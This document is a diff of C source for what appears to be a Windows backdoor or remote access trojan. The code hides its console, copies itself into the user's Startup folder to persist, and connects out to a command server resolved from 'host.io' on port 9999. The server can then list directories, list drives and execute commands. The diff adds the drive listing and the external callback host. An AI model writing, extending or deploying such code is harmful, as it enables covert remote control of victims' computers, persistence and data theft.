@@ -25,6 +25,7 @@ SOCKADDR_IN  hint;
 
 
 char err[7] = "error\n";
+char drives[100];
 
 
 int wsa_soc_con( char* IP, int port )
@@ -65,12 +66,35 @@ int check_path( char* path ){
     return 0;
 }
 
+void get_drives(){
+
+    char* letters[26] = {
+        "A:", "B:", "C:", "D:", "E:", 
+        "F:", "G:", "H:", "I:", "J:", 
+        "K:", "L:", "M:", "N:", "O:", 
+        "P:", "Q:", "R:", "S:", "T:", 
+        "U:", "V:", "W:", "X:", "Y:",
+        "Z:",
+    };
+
+    int count = 0;
+
+    for ( int i = 0; i < 26; i++ ) {
+        if ( check_path(letters[i]) == 0 ) {
+            drives[count] = 64+i+1;
+            count++;
+            drives[count] = '\n';
+            count++;
+        }
+    }
+}
+
 
 int to_startup( char* path, char* filename, char* out_name ) {
     FILE* fptr;
     FILE* fptw;
 
-    char buffer[BUFF_LEN];
+    char buffer[1];
     if ( (fptr = fopen(filename, "rb")) == 0 ) {
         return 1;
     }
@@ -79,8 +103,12 @@ int to_startup( char* path, char* filename, char* out_name ) {
         return 1;
     }
 
-    fread(buffer, sizeof(buffer), 1, fptr);
-    fwrite(buffer, sizeof(buffer), 1, fptw);
+    while ( fread(buffer, sizeof(buffer), 1, fptr) ) {
+        fwrite(buffer, sizeof(buffer), 1, fptw);
+    }
+
+    fclose(fptr);
+    fclose(fptw);
 
     return 0;
 }
@@ -155,6 +183,7 @@ int ls_dir( SOCKET sock ) {
     char* name;
     char store_one[BUFF_LEN];
     char send_dir[BUFF_LEN];
+    char send_one[1];
     int count = 0;
     int i;
 
@@ -196,18 +225,10 @@ int ls_dir( SOCKET sock ) {
 }
 
 
-int get_char_len( char* in ){
-    int output = 0;
-    for ( int i = 0; in[i] != '\0'; i++, output++ );
-
-    return output;
-}
-
-
 int first_word( char* found, char* command ){
-    int size = get_char_len(found);
+    int size = strlen(found);
 
-    if ( size >= get_char_len(command) ) {
+    if ( size >= strlen(command) ) {
         for ( int i = 0; i < size; i++ ) {
             if ( found[i] == ' ' && command[i] == ' ' || found[i] == ' ' && command[i] == '\0'
             || found[i] == '\n' && command[i] == '\0' ) 
@@ -349,6 +370,9 @@ void ClientSoc( char* IP , int port ) {
                 send(sock, "[*]Executed", sizeof("[*]Executed"), 0);
                 
             }
+            else if ( strcmp(buffrecv, "ls_drives\n") == 0 ) {
+                send(sock, drives, sizeof(drives), 0);
+            }
             else if ( strcmp(buffrecv, "exit_client\n") == 0 ) {
                 exit(1);
             }
@@ -362,13 +386,61 @@ void ClientSoc( char* IP , int port ) {
 
 
 int main( int argc, char* argv[] ) {
+    FreeConsole();
+
+    get_drives();
+
+    WSADATA wsaData;
+    DWORD dwError;
+    struct hostent *remoteHost;
+    char *host_name;
+    struct in_addr addr;
+
     char exe_path[900];
     char temp_name[300];
     char current_exe[300];
     char path_name[900];
     char* path = getenv("USERPROFILE");
     int count = 0;
-    int i;
+    int iResult;
+    int i = 0;
+    
+    
+    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if (iResult != 0) {
+        return 1;
+    }
+
+    host_name = "host.io";
+    remoteHost = gethostbyname(host_name);
+    
+    if ( remoteHost == NULL ) {
+        dwError = WSAGetLastError();
+        if ( dwError != 0 ) {
+            if ( dwError == WSAHOST_NOT_FOUND ) {
+                return 1;
+            } else if ( dwError == WSANO_DATA ) {
+                return 1;
+            } else {
+                return 1;
+            }
+        }
+    } else {
+        if ( remoteHost->h_addrtype == AF_INET )
+        {
+            while ( remoteHost->h_addr_list[i] != 0 ) {
+                addr.s_addr = *(u_long *) remoteHost->h_addr_list[i++];
+            }
+
+        }
+        else if ( remoteHost->h_addrtype == AF_NETBIOS )
+        {   
+            return 1;
+        }   
+    }
+
+    char* IP = inet_ntoa(addr);
+    int PORT = 9999;
 
     sprintf(path_name, "%s%s",  path, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
     
@@ -400,7 +472,8 @@ int main( int argc, char* argv[] ) {
         }
     }
 
-    FreeConsole();
-    ClientSoc("127.0.0.1", 9999);
+    
+    ClientSoc(IP, PORT);
+    
     return 0;
 }
